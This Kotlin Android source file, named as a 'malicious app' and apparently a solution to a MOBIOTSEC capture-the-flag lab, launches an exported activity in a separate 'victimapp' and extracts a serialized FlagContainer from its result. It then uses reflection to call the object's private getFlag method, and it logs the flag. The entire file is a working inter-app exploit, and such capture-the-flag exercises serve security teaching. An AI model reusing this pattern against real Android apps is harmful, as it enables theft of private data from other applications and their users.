package com.example.maliciousapp

import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.util.Log

import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

import com.example.victimapp.FlagContainer

class MainActivity : AppCompatActivity() {
    val TAG = "MOBIOTSEC"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
    }

    override fun onStart() {
        super.onStart()

        val intent = Intent().apply {
            component = ComponentName(
                "com.example.victimapp",
                "com.example.victimapp.SerialActivity"
            )
        }
        val contract = ActivityResultContracts.StartActivityForResult()
        registerForActivityResult(contract) { result ->
            try {
                val container = result
                    .data
                    ?.getSerializableExtra("flag", FlagContainer::class.java)

                container?.let {
                    val flag = it::class
                        .java
                        .getDeclaredMethod("getFlag")
                        .apply { setAccessible(true) }
                        .invoke(it)
                    Log.d(TAG, "The flag is $flag")
                }
            } catch (e: Exception) {
                Log.e(TAG, e.toString())
            }
        }.launch(intent)
    }
}
